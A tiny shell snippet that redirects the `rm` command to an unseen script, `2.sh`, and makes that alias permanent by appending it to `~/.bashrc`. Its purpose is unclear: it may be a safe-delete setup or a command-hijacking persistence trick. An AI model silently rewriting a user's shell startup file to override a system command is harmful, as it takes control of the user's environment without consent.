j=`pwd`
alias rm=$j/2.sh
alias rm > b.txt
cat >> ~/.bashrc b.txt
